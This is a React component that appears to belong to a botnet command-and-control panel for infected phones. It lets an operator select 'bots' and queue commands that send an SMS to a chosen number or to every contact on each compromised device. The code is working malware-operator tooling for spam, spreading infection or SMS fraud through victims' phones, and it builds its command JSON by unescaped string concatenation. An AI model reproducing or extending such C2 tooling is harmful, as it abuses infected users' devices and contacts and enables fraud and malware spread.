import { useContext, useState } from 'react';
import { Button, Input, notification } from "antd"
import { BotContext } from '../providers';
import { setCommand } from '../services';
import { ServerResponseType } from '../../../common/DataType';

export default ({load}: {load: () => void}) => {
  const { state, setState } = useContext(BotContext)
  const [phone, setPhone] = useState('')
  const [sms, setSMS] = useState('')

  const sendAll = () => {
    if (sms == '') {
      notification['error']({
        message: 'ERROR',
        description: 'Please fill the SMS text.'
      })

      return
    }

    if (state.selectedBots.length == 0) {
      notification['error']({
        message: 'ERROR',
        description: 'Please select the bot.'
      })

      return
    }

    setCommand(state.selectedBots, '{"name":"SendSMSALL", "text":"' + sms + '"}').then((res: ServerResponseType) => {
      notification['info']({
        message: res.type.toUpperCase(),
        description: res.message
      })
      load()

    })
  }  

  const send = () => {
    if (sms == '' || phone == '') {
      notification['error']({
        message: 'ERROR',
        description: 'Please fill the inputs.'
      })

      return
    }

    if (state.selectedBots.length == 0) {
      notification['error']({
        message: 'ERROR',
        description: 'Please select the bot.'
      })

      return
    }

    setCommand(state.selectedBots, '{"name":"sendSms","number":"' + phone + '","text":"' + sms + '"}').then((res: ServerResponseType) => {
      notification['info']({
        message: res.type.toUpperCase(),
        description: res.message
      })
      load()

    })
  }  
  
  return (
    <div className="pb-6">
      <h2 className="text-xl">Send SMS</h2>
      <span className="text-stone-500">Send sms from selected bots.</span>
      <p className="text-stone-500">Please fill only text for send sms to all contacts</p>
      <Input placeholder="Phone number + 1" className="!mb-2"  value={phone} onChange={(e: any) => setPhone(e.target.value)}/>
      <Input placeholder="SMS Text" className="!mb-2"  value={sms} onChange={(e: any) => setSMS(e.target.value)}/>
      <Button ghost type="primary" className="float-left" onClick={sendAll}>Send SMS To All</Button>
      <Button ghost type="primary" className="float-right" onClick={send}>Send SMS</Button>
    </div>
  )
}